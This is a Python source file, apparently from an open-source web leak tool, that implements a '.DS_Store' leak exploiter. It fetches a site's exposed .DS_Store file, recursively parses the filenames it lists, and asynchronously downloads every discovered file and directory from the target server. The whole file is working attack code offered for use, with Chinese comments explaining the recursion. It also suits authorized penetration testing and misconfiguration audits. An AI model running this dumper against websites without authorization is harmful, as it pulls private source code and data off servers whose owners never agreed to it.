#!/usr/bin/env python
# -*- coding:utf-8 -*-
"""
@author: HJK
@file: dsdumper
@time: 2019-10-26
"""

"""
.DS_Store泄漏利用工具
递归解析.DS_Store并下载文件
"""

import re
import click
import asyncio
from urllib.parse import urlparse
from asyncio.queues import Queue
from ..thirdparty import dsstore
from ..dumper import BasicDumper


class Dumper(BasicDumper):
    """ .DS_Store dumper """

    def __init__(self, url: str, outdir: str, force=False):
        super(Dumper, self).__init__(url, outdir, force)
        self.base_url = re.sub("/\.DS_Store.*", "", url)
        self.url_queue = Queue()

    async def start(self):
        """ dumper 入口方法 """
        # TODO：递归效率还可以优化，不过一般情况下已经够用
        await self.url_queue.put(self.base_url)
        # 递归解析.DS_Store，并把目标URL存到self.targets
        await self.parse_loop()

        await self.dump()

    async def dump(self):
        # 创建协程池，调用download
        task_pool = []
        for target in self.targets:
            task_pool.append(asyncio.create_task(self.download(target)))
        for t in task_pool:
            await t

    async def parse_loop(self):
        """ 从url_queue队列中读取URL，根据URL获取并解析DS_Store """
        while not self.url_queue.empty():
            base_url = await self.url_queue.get()
            status, ds_data = await self.fetch(base_url + "/.DS_Store")
            if status != 200 or not ds_data:
                continue
            try:
                # 解析DS_Store
                ds = dsstore.DS_Store(ds_data)
                for filename in set(ds.traverse_root()):
                    new_url = "%s/%s" % (base_url, filename)
                    await self.url_queue.put(new_url)
                    # 从URL中获取path并删除最前面的/
                    # 不删除/会导致path.join出错，从而导致创建文件失败
                    fullname = urlparse(new_url).path.lstrip("/")
                    self.targets.append((new_url, fullname))
            except Exception as e:
                # 如果解析失败则不是DS_Store文件
                click.secho(str(e.args), fg="red")
